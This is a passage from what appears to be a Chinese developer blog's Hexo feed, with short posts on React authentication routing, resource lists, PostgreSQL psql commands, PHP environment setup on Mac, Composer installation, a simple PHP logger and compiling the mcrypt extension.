</li></ol><p><em>写在最后</em><br>前端的发展历史正是一个从网页设计到软件设计的过程，在这个过程中，开发者的思维需要发生彻底的变化。前端领域使用的技术越来越和其他平台的客户端贯通，例如Angularjs中的MVVM很大一部分从.net中学习到的；数据和视图分离，面向对象和函数式编程也是前端领域重要的思维；另外一个方面前端也在慢慢的影响其他领域，JavaScript的事件和异步等特性也让java世界发生变化。<br>     我们不一定要成为全栈工程师，但需要拓宽技术眼界然后探究编程世界的内在本质，这样才能在学习和应用新的新的东西时得心应手，快速的在框架、平台、技术栈中切换。<br>就像在我们认为写AngularJS的时候，其实我们写的是JavaScript；当我们认为在写JavaScript的时，更多的需要意识到我们在编写可以被计算机运行的应用程序。 </p>]]></content>
      
      
      <categories>
          
          <category> reading&amp;writing </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python 入门</title>
      <link href="/python/python%20basic/"/>
      <url>/python/python%20basic/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>入门教程： <a href="http://www.runoob.com/python/python-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-tutorial.html</a></p><h2 id="Python-是什么？"><a href="#Python-是什么？" class="headerlink" title="Python 是什么？"></a>Python 是什么？</h2><p>Python 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。<br>Python 的设计具有很强的可读性，相比其他语言经常使用英文关键字，其他语言的一些标点符号，它具有比其他语言更有特色语法结构。</p><ul><li>Python 是一种解释型语言： 这意味着开发过程中没有了编译这个环节。类似于PHP和Perl语言。</li><li>Python 是交互式语言： 这意味着，您可以在一个Python提示符，直接互动执行写你的程序。</li><li>Python 是面向对象语言: 这意味着Python支持面向对象的风格或代码封装在对象的编程技术。</li><li>Python 是初学者的语言：Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到 WWW 浏览器再到游戏。</li></ul><h2 id="安装-Python-in-Mac"><a href="#安装-Python-in-Mac" class="headerlink" title="安装 Python in Mac"></a>安装 Python in Mac</h2><p><a href="https://www.python.org/downloads/" target="_blank" rel="noopener">https://www.python.org/downloads/</a><br>推荐使用版本为2.7</p><h2 id="进入交互模式"><a href="#进入交互模式" class="headerlink" title="进入交互模式"></a>进入交互模式</h2><p>linux上你只需要在命令行中输入 Python 命令即可启动交互式编程</p><p>## </p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React router 登录验证方案</title>
      <link href="/react/react/React+Redux+React%20router%20authentication/"/>
      <url>/react/react/React+Redux+React%20router%20authentication/</url>
      
        <content type="html"><![CDATA[<p>使用 react 高阶函数<br><a href="https://github.com/joshgeller/react-redux-jwt-auth-example" target="_blank" rel="noopener">https://github.com/joshgeller/react-redux-jwt-auth-example</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">router.js</span><br><span class="line"></span><br><span class="line">import &#123;HomeView, LoginView, ProtectedView&#125; from &apos;../views&apos;;</span><br><span class="line">import &#123;requireAuthentication&#125; from &apos;../components/AuthenticatedComponent&apos;;</span><br><span class="line"></span><br><span class="line">export default(</span><br><span class="line">    &lt;Route path=&apos;/&apos; component=&#123;App&#125;&gt;</span><br><span class="line">        &lt;IndexRoute component=&#123;HomeView&#125;/&gt;</span><br><span class="line">        &lt;Route path=&quot;login&quot; component=&#123;LoginView&#125;/&gt;</span><br><span class="line">        &lt;Route path=&quot;protected&quot; component=&#123;requireAuthentication(ProtectedView)&#125;/&gt;</span><br><span class="line">    &lt;/Route&gt;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import React from &apos;react&apos;;</span><br><span class="line">import &#123;connect&#125; from &apos;react-redux&apos;;</span><br><span class="line">import &#123;pushState&#125; from &apos;redux-router&apos;;</span><br><span class="line"></span><br><span class="line">export function requireAuthentication(Component) &#123;</span><br><span class="line"></span><br><span class="line">    class AuthenticatedComponent extends React.Component &#123;</span><br><span class="line"></span><br><span class="line">        componentWillMount() &#123;</span><br><span class="line">            this.checkAuth();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        componentWillReceiveProps(nextProps) &#123;</span><br><span class="line">            this.checkAuth();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        checkAuth() &#123;</span><br><span class="line">            if (!this.props.isAuthenticated) &#123;</span><br><span class="line">                let redirectAfterLogin = this.props.location.pathname;</span><br><span class="line">                this.props.dispatch(pushState(null, `/login?next=$&#123;redirectAfterLogin&#125;`));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        render() &#123;</span><br><span class="line">            return (</span><br><span class="line">                &lt;div&gt;</span><br><span class="line">                    &#123;this.props.isAuthenticated === true</span><br><span class="line">                        ? &lt;Component &#123;...this.props&#125;/&gt;</span><br><span class="line">                        : null</span><br><span class="line">                    &#125;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const mapStateToProps = (state) =&gt; (&#123;</span><br><span class="line">        token: state.auth.token,</span><br><span class="line">        userName: state.auth.userName,</span><br><span class="line">        isAuthenticated: state.auth.isAuthenticated</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    return connect(mapStateToProps)(AuthenticatedComponent);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> react </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React 资源收集</title>
      <link href="/React/react/React%20recource/"/>
      <url>/React/react/React%20recource/</url>
      
        <content type="html"><![CDATA[<p>React js 后端界面<br><a href="https://marmelab.com/admin-on-rest/Admin.html" target="_blank" rel="noopener">https://marmelab.com/admin-on-rest/Admin.html</a></p><p>React 测试工具</p><p><a href="https://github.com/airbnb/enzyme" target="_blank" rel="noopener">https://github.com/airbnb/enzyme</a></p><p>React 状态管理库</p><p><a href="https://github.com/reactjs/react-redux" target="_blank" rel="noopener">https://github.com/reactjs/react-redux</a></p><p>React 脚手架</p><p><a href="https://github.com/facebookincubator/create-react-app" target="_blank" rel="noopener">https://github.com/facebookincubator/create-react-app</a></p><p>React 组件库(无UI)</p><p>rc-*</p><p><a href="http://react-component.github.io/badgeboard/" target="_blank" rel="noopener">http://react-component.github.io/badgeboard/</a></p><p>Here is a list of react-component: <a href="http://react-component.github.io/badgeboard/" target="_blank" rel="noopener">http://react-component.github.io/badgeboard/</a></p><p>React component documentation tool story book</p><p><a href="https://github.com/storybooks/storybook" target="_blank" rel="noopener">https://github.com/storybooks/storybook</a></p><p>React UI和组件库</p><ul><li><a href="https://ant.design/" target="_blank" rel="noopener">https://ant.design/</a></li><li><a href="http://amazeui.org/" target="_blank" rel="noopener">http://amazeui.org/</a></li><li><a href="https://onsen.io/react/" target="_blank" rel="noopener">https://onsen.io/react/</a></li></ul><p>React boilerplate</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React Native 资源收集</title>
      <link href="/React-Native/react/React%20native%20resource/"/>
      <url>/React-Native/react/React%20native%20resource/</url>
      
        <content type="html"><![CDATA[<p>官网</p><p><a href="https://facebook.github.io/react-native/" target="_blank" rel="noopener">https://facebook.github.io/react-native/</a></p><p>React Native 开发工具</p><p><a href="https://expo.io/" target="_blank" rel="noopener">https://expo.io/</a></p><p>React Native 组件</p><p><a href="https://react-native-training.github.io/react-native-elements/" target="_blank" rel="noopener">https://react-native-training.github.io/react-native-elements/</a></p><p>React Native 脚手架</p><p><a href="https://github.com/react-community/create-react-native-app" target="_blank" rel="noopener">https://github.com/react-community/create-react-native-app</a></p><p>React Native 项目案例</p><ul><li>CNode,推荐学习 <a href="https://github.com/soliury/noder-react-native" target="_blank" rel="noopener">https://github.com/soliury/noder-react-native</a></li></ul><p>React Native boilerplate</p><p><a href="https://github.com/linksgo2011/react-native-ts-most" target="_blank" rel="noopener">https://github.com/linksgo2011/react-native-ts-most</a></p><p>React Native project deployment</p>]]></content>
      
      
      <categories>
          
          <category> React Native </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP拓展和使用C编写自定义拓展</title>
      <link href="/C-C/php/php-plugin-c/"/>
      <url>/C-C/php/php-plugin-c/</url>
      
        <content type="html"><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>PHP的一个拓展方法就是使用C来编写PHP插件,可以带来极大的性能提升和实现系统层面的拓展。推荐使用C来编写,但是C++特性更为丰富并且有大量的库来支持我们的任务,因此C++也是更好的选择。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>PHP 源码解读和插件编写基本知识 <a href="http://www.php-internals.com/" target="_blank" rel="noopener">http://www.php-internals.com/</a></li><li>C++库用于简化插件编写 <a href="https://github.com/rioderelfte/php-cpp-extension" target="_blank" rel="noopener">https://github.com/rioderelfte/php-cpp-extension</a></li><li>V8引擎插件 <a href="https://github.com/phpv8/v8js" target="_blank" rel="noopener">https://github.com/phpv8/v8js</a></li><li>基于php-cpp的Qr code插件 <a href="https://github.com/Leon2012/phpqrencode" target="_blank" rel="noopener">https://github.com/Leon2012/phpqrencode</a></li><li>PHP MVC框架的拓展实现 <a href="https://github.com/phalcon/cphalcon" target="_blank" rel="noopener">https://github.com/phalcon/cphalcon</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PostgreSQL 入门使用</title>
      <link href="/postgreSQL/postgreSQL/get%20start/"/>
      <url>/postgreSQL/postgreSQL/get%20start/</url>
      
        <content type="html"><![CDATA[<p>Tutorial</p><p><a href="http://www.postgresqltutorial.com/" target="_blank" rel="noopener">http://www.postgresqltutorial.com/</a></p><h2 id="install-postgreSQL-via-homebrew-in-mac"><a href="#install-postgreSQL-via-homebrew-in-mac" class="headerlink" title="install postgreSQL via homebrew in mac"></a>install postgreSQL via homebrew in mac</h2><blockquote><p>brew install postgresql</p></blockquote><h2 id="connect-to-postgreSQL-via-psql"><a href="#connect-to-postgreSQL-via-psql" class="headerlink" title="connect to postgreSQL via psql"></a>connect to postgreSQL via psql</h2><p>psql 是一个命令行工具操作postgreSQL</p><blockquote><p>psql -h localhost -U freewheelers –password -d freewheelers</p></blockquote><p>and type your password.</p><h2 id="常用psql命令"><a href="#常用psql命令" class="headerlink" title="常用psql命令"></a>常用psql命令</h2><p>在psql中使用\l \dt 等命令用于管理数据库，一旦打开数据，所有功能都可以使用SQL的DML、DDL语言来操作。</p><p>列出所有的数据库</p><blockquote><p>\l </p></blockquote><p>列出当前数据库所有的表</p><blockquote><p>\dt </p></blockquote><p>列出所有的functions</p><blockquote><p>\df</p></blockquote><p>列出所有的user and roles</p><blockquote><p>\du</p></blockquote><p>获取version</p><blockquote><p>SELECT version</p></blockquote><p>重复最后一次命令</p><blockquote><p>\g</p></blockquote><p>命令历史</p><blockquote><p>\s</p></blockquote><p>获取帮助</p><blockquote><p>\?</p></blockquote><p>在编辑器中编辑命令然后执行</p><blockquote><p>\e</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> postgreSQL </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React学习体系</title>
      <link href="/react/react/React%20crouse%20map/"/>
      <url>/react/react/React%20crouse%20map/</url>
      
        <content type="html"><![CDATA[<h2 id="参考的几家课程体系："><a href="#参考的几家课程体系：" class="headerlink" title="参考的几家课程体系："></a>参考的几家课程体系：</h2><ul><li><a href="http://www.zhufengpeixun.cn/react/index.html" target="_blank" rel="noopener">http://www.zhufengpeixun.cn/react/index.html</a> </li><li><a href="http://www.jikexueyuan.com/course/reactjs/" target="_blank" rel="noopener">http://www.jikexueyuan.com/course/reactjs/</a></li><li><a href="https://roadtoreact.com/course-details?courseId=THE_ROAD_TO_LEARN_REACT" target="_blank" rel="noopener">https://roadtoreact.com/course-details?courseId=THE_ROAD_TO_LEARN_REACT</a></li></ul><h2 id="课程列表"><a href="#课程列表" class="headerlink" title="课程列表"></a>课程列表</h2><ol><li>环境搭建和ES基础<ul><li>前端开发历史沿革</li><li>开发环境</li><li>Gitflow工作流</li><li>ES6新特性介绍</li></ul></li><li>webpack工程化前端项目<ul><li>Webpack的使用</li><li>Babel使用</li><li>测试环境的准备</li><li>JS linter</li><li>Webpack各种Loader配置</li></ul></li><li>React基础<ul><li>React基本思想</li><li>JSX语法</li><li>组件生命周期</li><li>Children使用场景</li><li>高阶组件</li></ul></li><li>React生态和周边工具库<ul><li>react-router前端路由管理</li><li>React中表单数据收集、验证、回写</li><li>React文件上传</li><li>React其他开源组件使用</li><li>Enzyme测试React组件</li><li>React组件文档工具storybook</li></ul></li><li>Redux管理以及API集成<ul><li>理解redux</li><li>react-redux使用</li><li>Logger中间件</li><li>Tthunk中间件实现异步action</li><li>Redux调试工具</li></ul></li><li>CI/CD部署上线以及版本管理<ul><li>CI工具介绍</li><li>多环境配置</li><li>使用semantic-release进行版本管理</li><li>私有仓库</li></ul></li></ol><p>PS: 测试和项目实践贯穿整个过程</p>]]></content>
      
      
      <categories>
          
          <category> react </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CakePHP 脚手架和命令行工具</title>
      <link href="/php/php/cakephp%20scaffold/"/>
      <url>/php/php/cakephp%20scaffold/</url>
      
        <content type="html"><![CDATA[<p>CakePHP提供了一个bake命令行工具,提供了一套代码创建命令行工具,可以根据数据库创建模型和控制器视图等。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CakePHP 资源收集</title>
      <link href="/php/php/cakephp%20resource/"/>
      <url>/php/php/cakephp%20resource/</url>
      
        <content type="html"><![CDATA[<p>akePHP is a rapid development framework for PHP which uses commonly known design patterns like Active Record, Association Data Mapping, Front Controller and MVC. Our primary goal is to provide a structured framework that enables PHP users at all levels to rapidly develop robust web applications, without any loss to flexibility.</p><p>The Cake Software Foundation - promoting development related to CakePHP<br><a href="http://cakefoundation.org/" target="_blank" rel="noopener">http://cakefoundation.org/</a></p><p>CakePHP - the rapid development PHP framework<br><a href="http://www.cakephp.org" target="_blank" rel="noopener">http://www.cakephp.org</a></p><p>Cookbook - user documentation for learning about CakePHP<br><a href="http://book.cakephp.org" target="_blank" rel="noopener">http://book.cakephp.org</a></p><p>API - quick reference to CakePHP<br><a href="http://api.cakephp.org" target="_blank" rel="noopener">http://api.cakephp.org</a></p><p>The Bakery - everything CakePHP<br><a href="http://bakery.cakephp.org" target="_blank" rel="noopener">http://bakery.cakephp.org</a></p><p>The Show - live and archived podcasts about CakePHP and more<br><a href="http://live.cakephp.org" target="_blank" rel="noopener">http://live.cakephp.org</a></p><p>CakePHP TV - screen casts from events and video tutorials<br><a href="http://tv.cakephp.org" target="_blank" rel="noopener">http://tv.cakephp.org</a></p><p>CakePHP Google Group - community mailing list and forum<br><a href="http://groups.google.com/group/cake-php" target="_blank" rel="noopener">http://groups.google.com/group/cake-php</a></p><p>#cakephp on irc.freenode.net - chat with CakePHP developers<br>irc://irc.freenode.net/cakephp</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP环境in Mac</title>
      <link href="/php/php/php-environment-in-mac/"/>
      <url>/php/php/php-environment-in-mac/</url>
      
        <content type="html"><![CDATA[<p>实际上Mac系统自带了PHP和Apache的开发环境</p><p>1、Apache相关</p><p>Mac系统自带apache服务器，我们只需要配置相关信息并进行开启服务即可</p><p>sudo vim /etc/apache2/httpd.conf</p><p>打开对PHP的支持,第169行左右</p><p>LoadModule php5_module libexec/apache2/libphp5.so</p><p>2、测试</p><p>系统默认会访问／Library/WebServer/Document/index.html.en文件</p><p>为了方便测试，在此目录下新建一个test.php文件，并输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">phpinfo();</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问localhost/test.php，会直接打印出phpinfo中的各种信息</p><p>3、PHP配置</p><p>在做第二步测试的时候，扩展里面date会出现错误，原因是默认php.ini没有对date.timezone进行设置，系统默认UTC的时区，所以我们要开启对php.ini的设置</p><p>sudo cp /etc/php.ini.default php.ini</p><p>先把默认配置文件复制一份，然后给复制好的配置文件增加写的权限</p><p>sudo chmod +w php.ini</p><p>找到date.timezone，先把默认的注释给删除掉，然后直接后面配置成PRC即可</p><p>4、测试</p><p>再次访问localhost/test.php，date扩展就OK了！</p><p>使用自带的Apache</p><p>sudo apachectl start</p><p>sudo apachectl stop</p><p>sudo apachectl restart</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mac 环境下使用MAMP安装PHP环境</title>
      <link href="/php/php/php-mamp/"/>
      <url>/php/php/php-mamp/</url>
      
        <content type="html"><![CDATA[<p>下载安装MAMP</p><p><a href="https://www.mamp.info/en/mamp-pro/" target="_blank" rel="noopener">https://www.mamp.info/en/mamp-pro/</a></p><p>设置默认的PHP为MAMP</p><blockquote><p>export PATH=”/Applications/MAMP/bin/php/php5.5.38/bin:$PATH”</p></blockquote><p>另一种方法更为简便,为MAMP的PHP设置一个别名即可</p><blockquote><p>alias phpmamp=/Applications/MAMP/bin/php/php5.5.38/bin/php</p></blockquote><p>破解安装更多版本的PHP</p><p>MAMP PRO 提供了更多的PHP版本选择,但是MAMP只提供了2个,实际上在MAMP安装目录下有多个PHP版本我们可以删除一些无用的PHP版本即可。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 不同场景下技术选型的讨论</title>
      <link href="/php/php/lightweight%20php%20api/"/>
      <url>/php/php/lightweight%20php%20api/</url>
      
        <content type="html"><![CDATA[<h2 id="构建独立的API应用"><a href="#构建独立的API应用" class="headerlink" title="构建独立的API应用"></a>构建独立的API应用</h2><p>不使用框架而搭建轻量级灵活的API接口，满足基本业务需求要求拓展性好。</p><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h3><ul><li>Composer 包管理工具</li><li>ToroPHP PHP路由框架</li><li>Medoo PHP数据库ORM框架</li><li>Monolog 日志框架</li><li>JWT token消费和验证</li></ul><h2 id="构建小型企业网站"><a href="#构建小型企业网站" class="headerlink" title="构建小型企业网站"></a>构建小型企业网站</h2><p>推荐使用 <a href="http://www.x6cms.com/" target="_blank" rel="noopener">x6cms</a> 这个cms的好处是构建了一个非常简单和完善的管理系统，该cms使用了CI框架开发</p><h2 id="构建微信应用"><a href="#构建微信应用" class="headerlink" title="构建微信应用"></a>构建微信应用</h2><p>推荐使用微擎，phpWechat</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 包管理工具</title>
      <link href="/php/php/PHP%20package%20manager/"/>
      <url>/php/php/PHP%20package%20manager/</url>
      
        <content type="html"><![CDATA[<p>PHP中可以使用的包管理工具为 composer<br>官网:<a href="https://getcomposer.org" target="_blank" rel="noopener">https://getcomposer.org</a></p><p>安装:<a href="https://getcomposer.org/download/" target="_blank" rel="noopener">https://getcomposer.org/download/</a></p><p>安装composer</p><blockquote><p>php -r “copy(‘<a href="https://getcomposer.org/installer&#39;" target="_blank" rel="noopener">https://getcomposer.org/installer&#39;</a>, ‘composer-setup.php’);”</p></blockquote><blockquote><p>php -r “if (hash_file(‘SHA384’, ‘composer-setup.php’) === ‘669656bab3166a7aff8a7506b8cb2d1c292f042046c5a994c43155c0be6190fa0355160742ab2e1c88d40d5be660b410’) { echo ‘Installer verified’; } else { echo ‘Installer corrupt’; unlink(‘composer-setup.php’); } echo PHP_EOL;”</p></blockquote><blockquote><p>php composer-setup.php</p></blockquote><blockquote><p>php -r “unlink(‘composer-setup.php’);”</p></blockquote><p>浏览PHP包:</p><p><a href="http://packagist.org" target="_blank" rel="noopener">http://packagist.org</a></p><p>使用composer</p><p>在工作目录下添加composer.json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;cakephp-boilerplate&quot;,</span><br><span class="line">    &quot;require&quot;: &#123;</span><br><span class="line">        &quot;cakephp/cakephp&quot;: &quot;2.9.*&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;config&quot;: &#123;</span><br><span class="line">        &quot;vendor-dir&quot;: &quot;Vendor/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>php composer.phar install</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一段简单的PHP 日志代码</title>
      <link href="/php/php/A%20simple%20log%20feature/"/>
      <url>/php/php/A%20simple%20log%20feature/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">"SEPARATOR"</span>,<span class="string">" | "</span>);</span><br><span class="line">define(<span class="string">"BASE_FILE_NAME"</span>,<span class="keyword">__DIR__</span>.<span class="string">"/../log/log.txt"</span>);</span><br><span class="line"></span><br><span class="line">file_put_contents(BASE_FILE_NAME,<span class="string">"\n"</span>.date(<span class="string">"Y-m-d h:i:s"</span>).</span><br><span class="line">    SEPARATOR.$_SERVER[<span class="string">'PHP_SELF'</span>].SEPARATOR.</span><br><span class="line">    str_replace(<span class="string">"\n"</span>,<span class="string">""</span>,json_encode($_POST) ),</span><br><span class="line">    FILE_APPEND</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转存日志文件</span></span><br><span class="line">$currentDayFileName = <span class="keyword">__DIR__</span>.<span class="string">"/../log/"</span>.date(<span class="string">"Y-m-d"</span>,time()<span class="number">-60</span>*<span class="number">60</span>*<span class="number">24</span>).<span class="string">"_log.txt"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists($currentDayFileName))&#123;</span><br><span class="line">    file_put_contents($currentDayFileName,file_get_contents(BASE_FILE_NAME));</span><br><span class="line">    file_put_contents(BASE_FILE_NAME,<span class="string">""</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>投资理财产品</title>
      <link href="/other/others/financing/"/>
      <url>/other/others/financing/</url>
      
        <content type="html"><![CDATA[<p>## </p><ul><li>股票<ul><li>起步资金 1000</li></ul></li><li><p>基金</p><ul><li>归票</li><li>指数</li><li>混合</li><li>货币</li></ul></li><li><p>期货/合约</p></li><li><p>数字货币</p></li><li><p>货币/外汇</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP拓展Linux/unix 下的编译安装</title>
      <link href="/php/php/PHP%20extension/"/>
      <url>/php/php/PHP%20extension/</url>
      
        <content type="html"><![CDATA[<p>在Linux下PHP如果出现了拓展不能被安装的情况时,需要自己安装拓展。</p><p>一般来说需要安装相应系统库:比如libmcrypt和相应的拓展.so文件,下面使用mycrypt作为例子</p><p>MCrypt是一个功能强大的加密算法扩展库，它包括有22种算法。</p><p>1:下载并解压mcrypt-2.6.8.tar.bz2。（2.6.8为版本号，可以自行选择，但是注意后边步骤要与下载的版本号一致。）<br>2:在终端执行命令（注意如下命令需要安装xcode支持）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd ~/Downloads/mcrypt-2.5.8</span><br><span class="line">./configure --disable-posix-threads --enable-static</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><em>实际上这一步在Ubuntu上可以使用 apt-get 工具安装,在Mac上使用homebrew安装</em></p><p>3：下载并解压php源码，根据自己情况选择对应版本。(注意以下命令中php的版本)<br>在终端执行命令：（如果出错请看后边）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Downloads/php-5.5.14/ext/mcrypt</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">cd modules</span><br><span class="line">sudo cp mcrypt.so /usr/lib/php/extensions/no-debug-non-zts-20121212/</span><br><span class="line">//上面可以使用make install 代替</span><br></pre></td></tr></table></figure><p>（cd modules后当出现</p><p>Build complete.<br>Don’t forget to run ‘make test’.<br>表示安装成功。）</p><p>*</p><p>直接安装拓展<br><a href="https://stackoverflow.com/questions/24749950/error-no-available-formula-for-php54-mcrypt-on-mac-os-x-mavericks" target="_blank" rel="noopener">https://stackoverflow.com/questions/24749950/error-no-available-formula-for-php54-mcrypt-on-mac-os-x-mavericks</a></p><p>*</p><p>4：打开php.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/php.ini</span><br></pre></td></tr></table></figure><p>添加如下代码：（注意no-debug-non-zts-20121212版本号，如果不清楚可以前往/usr/lib/php/extensions/查看）</p><p>extension=/usr/lib/php/extensions/no-debug-non-zts-20121212/mcrypt.so<br>*如果phpize出现如下错误：</p><p>grep: /usr/include/php/main/php.h: No such file or directory<br>grep: /usr/include/php/Zend/zend_modules.h: No such file or directory<br>grep: /usr/include/php/Zend/zend_extensions.h: No such file or directory<br>Configuring for:<br>PHP Api Version:<br>Zend Module Api No:<br>Zend Extension Api No:<br>Cannot find autoconf. Please check your autoconf installation and the<br>$PHP_AUTOCONF environment variable. Then, rerun this script.<br>表示需要安装autoconf</p><p>*如果make出现如下错误：</p><p>/ext/mcrypt/mcrypt.c:25:10: fatal error: ‘php.h’ file not found<br>执行如下命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.10.sdk/usr/include /usr/include</span><br></pre></td></tr></table></figure><p><em>注意MacOSX10.10.sdk修改为自己系统的版本号</em></p><p>如果遇到<br>Configuring for:<br>PHP Api Version:         20121113<br>Zend Module Api No:      20121212<br>Zend Extension Api No:   220121212<br>Cannot find autoconf. Please check your autoconf installation and the<br>$PHP_AUTOCONF environment variable. Then, rerun this script.</p><p>参考:<a href="https://stackoverflow.com/questions/31583646/cannot-find-autoconf-please-check-your-autoconf-installation-xampp-in-centos" target="_blank" rel="noopener">https://stackoverflow.com/questions/31583646/cannot-find-autoconf-please-check-your-autoconf-installation-xampp-in-centos</a></p><p>For CentOS:</p><blockquote><h1 id="yum-install-autoconf"><a href="#yum-install-autoconf" class="headerlink" title="yum install autoconf"></a>yum install autoconf</h1></blockquote><p>for Ubuntu :</p><blockquote><h1 id="apt-get-install-autoconf"><a href="#apt-get-install-autoconf" class="headerlink" 